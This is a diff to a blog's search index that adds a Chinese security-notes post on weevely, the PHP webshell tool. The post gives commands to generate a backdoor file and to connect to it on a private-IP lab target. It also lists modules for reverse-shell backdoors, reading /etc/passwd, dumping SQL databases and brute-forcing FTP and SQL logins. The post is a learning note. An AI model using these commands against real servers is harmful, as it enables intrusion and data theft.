@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>weevely的简单使用</title>
+      <link href="/2022/09/01/wlaq/weevely%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
+      <url>/2022/09/01/wlaq/weevely%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
+      
+        <content type="html"><![CDATA[<h1 id="简介：weevely是php菜刀，weevely是kali自带的菜刀工具"><a href="#简介：weevely是php菜刀，weevely是kali自带的菜刀工具" class="headerlink" title="简介：weevely是php菜刀，weevely是kali自带的菜刀工具"></a>简介：weevely是php菜刀，weevely是kali自带的菜刀工具</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">连接weevely生成的木马 ： weevely &lt;URL&gt; &lt;password&gt; [cmd]</span><br><span class="line"></span><br><span class="line">加载session会话文件 ： weevely session &lt;path&gt; [cmd]</span><br><span class="line"></span><br><span class="line">生成weevely后门木马文件 ：       weevely generate &lt;password&gt; &lt;path&gt;</span><br></pre></td></tr></table></figure><p>webshell文件生成指令  <code>weevely generate test /root/test.php</code><br><img src="https://pic.imgdb.cn/item/63104cac16f2c2beb1394e0a.jpg"></p><p>webshell连接指令  <code>weevely http://172.16.30.154/hackable/uploads/test.php test</code><br><img src="https://pic.imgdb.cn/item/63104da416f2c2beb139cbab.jpg"></p><blockquote><p>tab键查看所有模块</p></blockquote><h1 id="部分模块使用演示"><a href="#部分模块使用演示" class="headerlink" title="部分模块使用演示"></a>部分模块使用演示</h1><blockquote><p>使用命令:audit_phpconf 查看目标靶机服务器php的配置文件<br><img src="https://pic.imgdb.cn/item/63104e4116f2c2beb13a1af5.jpg"></p></blockquote><blockquote><p>使用:file_upload &#x2F;root&#x2F;hello.php backdoor.php上传本地文件到目标服务器上<br><img src="https://pic.imgdb.cn/item/63104efa16f2c2beb13a854a.jpg"></p></blockquote><blockquote><p>使用命令:file_check来检查目标站点下文件的状态及参数信息（md5值，大小，权限等）<br><img src="https://pic.imgdb.cn/item/63104f5816f2c2beb13ab3b9.jpg"></p></blockquote><blockquote><p>下面file_check对应的命令的具体作用为：:file_check Md5 文件的md5值、:file_check size文件大小、:file_check file判断是文件还是文档、:file_check exists判断文件是否存在、:file_check perms文件权限值、:file_check datetime创建日期<br><img src="http://172.16.30.9/api/attachment?type=courseDocument&id=4176"></p></blockquote><h1 id="weevely常用的模块"><a href="#weevely常用的模块" class="headerlink" title="weevely常用的模块"></a>weevely常用的模块</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">net_scan [IP]  //执行内网端口扫描</span><br><span class="line">system.info   //收集系统信息文件          </span><br><span class="line">file.rm           //删除文件</span><br><span class="line">file.read        //读文件</span><br><span class="line">file.upload        //上传本地文件</span><br><span class="line">file.check        //检查文件的权限和</span><br><span class="line">file.enum        //在本地词表的书面枚举远程文件</span><br><span class="line">file.download        //下载远程二进制/ ASCII文件到本地SQL</span><br><span class="line">sql.query        //执行SQL查询</span><br><span class="line">sql.console        //启动SQL控制台</span><br><span class="line">sql.dump        //获取SQL数据库转储</span><br><span class="line">sql.summary        //获取SQL数据库中的表和列后门</span><br><span class="line">backdoor.tcp                //TCP端口后门</span><br><span class="line">backdoor.install        //安装后门</span><br><span class="line">backdoor.reverse_tcp        //反弹枚举</span><br><span class="line">audit.user_files        //在用户家中列举常见的机密文件</span><br><span class="line">audit.user_web_files        //列举常见的Web文件</span><br><span class="line">audit.etc_passwd        //枚举/etc/passwd查找</span><br><span class="line">find.webdir        //查找可写的web目录</span><br><span class="line">find.perm        //查找权限可读/写/可执行文件和目录</span><br><span class="line">find.name        //按名称查找文件和目录</span><br><span class="line">find.suidsgid        //查找SUID / SGID文件和目录暴破</span><br><span class="line">bruteforce.sql                //暴力破解单一SQL用户</span><br><span class="line">bruteforce.sql_users        //暴力破解SQL密码</span><br><span class="line">bruteforce.ftp               // 暴力破解单一FTP用户</span><br><span class="line">bruteforce.ftp_users        //暴力破解FTP密码</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安笔记 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> weevely,网安工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Hello World</title>
       <link href="/2022/08/24/hello-world/"/>
       <url>/2022/08/24/hello-world/</url>
